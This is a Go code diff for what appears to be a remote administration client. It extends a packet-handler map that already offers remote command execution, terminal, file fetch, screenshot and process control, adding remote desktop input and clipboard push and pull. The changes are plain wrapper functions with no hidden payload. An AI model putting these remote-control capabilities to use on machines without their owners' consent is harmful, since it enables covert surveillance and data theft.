@@ -17,32 +17,38 @@ import (
 )
 
 var handlers = map[string]func(pack modules.Packet, wsConn *common.Conn){
-	`PING`:             ping,
-	`OFFLINE`:          offline,
-	`LOCK`:             lock,
-	`LOGOFF`:           logoff,
-	`HIBERNATE`:        hibernate,
-	`SUSPEND`:          suspend,
-	`RESTART`:          restart,
-	`SHUTDOWN`:         shutdown,
-	`SCREENSHOT`:       screenshot,
-	`TERMINAL_INIT`:    initTerminal,
-	`TERMINAL_INPUT`:   inputTerminal,
-	`TERMINAL_RESIZE`:  resizeTerminal,
-	`TERMINAL_PING`:    pingTerminal,
-	`TERMINAL_KILL`:    killTerminal,
-	`FILES_LIST`:       listFiles,
-	`FILES_FETCH`:      fetchFile,
-	`FILES_REMOVE`:     removeFiles,
-	`FILES_UPLOAD`:     uploadFiles,
-	`FILE_UPLOAD_TEXT`: uploadTextFile,
-	`PROCESSES_LIST`:   listProcesses,
-	`PROCESS_KILL`:     killProcess,
-	`DESKTOP_INIT`:     initDesktop,
-	`DESKTOP_PING`:     pingDesktop,
-	`DESKTOP_KILL`:     killDesktop,
-	`DESKTOP_SHOT`:     getDesktop,
-	`COMMAND_EXEC`:     execCommand,
+	`PING`:                   ping,
+	`OFFLINE`:                offline,
+	`LOCK`:                   lock,
+	`LOGOFF`:                 logoff,
+	`HIBERNATE`:              hibernate,
+	`SUSPEND`:                suspend,
+	`RESTART`:                restart,
+	`SHUTDOWN`:               shutdown,
+	`SCREENSHOT`:             screenshot,
+	`TERMINAL_INIT`:          initTerminal,
+	`TERMINAL_INPUT`:         inputTerminal,
+	`TERMINAL_RESIZE`:        resizeTerminal,
+	`TERMINAL_PING`:          pingTerminal,
+	`TERMINAL_KILL`:          killTerminal,
+	`FILES_LIST`:             listFiles,
+	`FILES_FETCH`:            fetchFile,
+	`FILES_REMOVE`:           removeFiles,
+	`FILES_UPLOAD`:           uploadFiles,
+	`FILE_UPLOAD_TEXT`:       uploadTextFile,
+	`PROCESSES_LIST`:         listProcesses,
+	`PROCESS_KILL`:           killProcess,
+	`DESKTOP_INIT`:           initDesktop,
+	`DESKTOP_PING`:           pingDesktop,
+	`DESKTOP_KILL`:           killDesktop,
+	`DESKTOP_SHOT`:           getDesktop,
+	`DESKTOP_MONITORS`:       listDesktopMonitors,
+	`DESKTOP_SET_MONITOR`:    setDesktopMonitor,
+	`DESKTOP_SET_QUALITY`:    setDesktopQuality,
+	`DESKTOP_INPUT`:          desktopInput,
+	`DESKTOP_CLIPBOARD_PUSH`: desktopClipboardPush,
+	`DESKTOP_CLIPBOARD_PULL`: desktopClipboardPull,
+	`COMMAND_EXEC`:           execCommand,
 }
 
 func ping(pack modules.Packet, wsConn *common.Conn) {
@@ -338,6 +344,30 @@ func killDesktop(pack modules.Packet, wsConn *common.Conn) {
 
 func getDesktop(pack modules.Packet, wsConn *common.Conn) {
 	desktop.GetDesktop(pack)
+}
+
+func listDesktopMonitors(pack modules.Packet, wsConn *common.Conn) {
+	desktop.ListMonitors(pack)
+}
+
+func setDesktopMonitor(pack modules.Packet, wsConn *common.Conn) {
+	desktop.SetMonitor(pack)
+}
+
+func setDesktopQuality(pack modules.Packet, wsConn *common.Conn) {
+	desktop.SetQuality(pack)
+}
+
+func desktopInput(pack modules.Packet, wsConn *common.Conn) {
+	desktop.HandleDesktopInput(pack)
+}
+
+func desktopClipboardPush(pack modules.Packet, wsConn *common.Conn) {
+	desktop.ClipboardPush(pack)
+}
+
+func desktopClipboardPull(pack modules.Packet, wsConn *common.Conn) {
+	desktop.ClipboardPull(pack)
 }
 
 func execCommand(pack modules.Packet, wsConn *common.Conn) {
